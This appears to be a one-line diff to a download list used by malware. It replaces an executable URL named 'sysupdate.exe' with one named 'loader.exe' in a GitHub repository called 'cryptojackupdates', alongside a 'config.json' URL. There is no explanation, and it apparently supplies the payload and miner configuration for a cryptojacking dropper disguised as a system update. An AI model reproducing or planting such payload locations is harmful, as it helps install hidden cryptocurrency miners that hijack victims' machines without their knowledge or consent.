@@ -1,1 +1,1 @@
-https://raw.githubusercontent.com/ian-noh-dot/cryptojackupdates/main/sysupdate.exe|https://raw.githubusercontent.com/ian-noh-dot/cryptojackupdates/main/config.json
+https://raw.githubusercontent.com/ian-noh-dot/cryptojackupdates/main/loader.exe|https://raw.githubusercontent.com/ian-noh-dot/cryptojackupdates/main/config.json
